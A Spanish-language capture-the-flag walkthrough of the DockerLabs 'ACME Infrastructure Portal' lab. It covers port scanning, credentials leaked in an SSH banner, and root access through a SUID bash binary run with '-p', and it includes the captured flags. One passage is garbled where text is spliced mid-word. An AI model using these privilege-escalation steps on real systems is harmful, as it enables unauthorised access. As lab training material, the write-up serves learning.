Writeup: ACME Infrastructure Portal (DockerLabs) 

​Documentación del proceso de reconocimiento, acceso inicial y escalada de privilegios en el entorno vulnerable de DockerLabs ACME Infrastructure Portal.

​🎯 Información General ​Plataforma: DockerLabs ​IP Objetivo: 172.17.0.3 ​Servicios Detectados: SSH (22/tcp), HTTP (80/tcp) ​Vector de Ataque: SSH Banner Leakage / SUID Binary Exploitation ​1. Reconocimiento (Reconnaissance) ​Escaneo de Puertos con Nmap 

​Comenzamos ejecutando un escaneo de puertos sobre la IP objetivo para identificar los servicios activos:


nmap -v -sS -p- 172.17.0.3

Resultado:

​22/tcp - Open (SSH) ​80/tcp - Open (HTTP - Apache/2.4.52) ​Inspección del Servicio Web (Port 80) 

​Exploramos la web tanto desde el navegador como mediante cabeceras e inspección del código fuente HTML utilizando curl:

# Inspección de cabeceras HTTP
curl -I 172.17.0.3

# Inspección de la estructura e instrucciones en el HTML
curl -s 172.17.0.3

El sitio web muestra una interfaz de mantenimiento de ACME Infrastructure Portal que indica que el acceso a la consola se realiza exclusivamente vía SSH y que conectándose con cualquier usuario se mostrará el aviso del sistema.

​2. Acceso Inicial (Initial Access) ​Intercepción del SSH Banner Leakage 

​Probamos una conexión SSH arbitraria con la IP para visualizar el mensaje de bienvenida (Banner) emitido por el nodo de mantenimiento:

ssh admin@172.17.0.3

Al intentar la conexión, el banner del SSH expone directamente las credenciales temporales del sistema:

[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migracion a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!

Autenticación SSH e Infección Inicial 

​Accedemos formalmente al sistema utilizando las credenciales obtenidas:

ssh usuario@172.17.0.3
# Contraseña: P@ssw0rd2026_CTF!

Una vez dentro, leemos la primera flaBúsqueda de Binarios SUID 

​Procedemos a enumerar los binarios del sistema que tienen activo el bit SUID (-perm -4000):


g ubicada en el directorio del usuario:

3. Escalada de Privilegios (Privilege Escalation) ​Enumeración de Permisos 

​Verificamos si el usuario usuario cuenta con permisos Sudo ejecutando sudo -l o sudo su, pero el usuario no pertenece al grupo sudoers:

sudo -l
# Result: Sorry, user usuario may not run sudo on d96c614ed1f8.

Búsqueda de Binarios SUID 

​Procedemos a enumerar los binarios del sistema que tienen activo el bit SUID (-perm -4000):

find / -perm -4000 2>/dev/null

Entre la lista de binarios devueltos, destaca que /usr/bin/bash tiene permisos SUID configurados con el propietario root:

-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash

Explotación de SUID Bash 

​Aprovechamos el bit SUID del binario /usr/bin/bash ejecutándolo con la bandera -p para mantener los privilegios efectivos del propietario (root):

/usr/bin/bash -p

Verificamos la elevación de privilegios:

whoami
# Output: root

id
# Output: uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)

Finalmente, leemos la flag de root:

cat /root/root.txt
# FLAG: FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}

Resumen de Flags ​User Flag: FLAG{nmap_recon_ssh_foothold_7a9f24e1} ​Root Flag: FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b} 
